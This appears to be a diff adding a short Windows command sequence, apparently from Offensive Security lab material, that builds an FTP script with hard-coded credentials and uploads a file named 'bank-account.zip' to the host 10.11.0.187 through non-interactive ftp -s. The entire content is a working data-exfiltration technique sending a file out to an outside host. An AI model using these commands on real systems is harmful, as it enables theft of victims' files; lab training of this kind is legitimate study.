@@ -1,0 +1,8 @@
+echo open 10.11.0.187 21> ftp.txt
+echo USER offsecuser>> ftp.txt
+echo test1234>> ftp.txt
+echo bin >> ftp.txt
+echo PUT bank-account.zip >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -s:ftp.txt
+
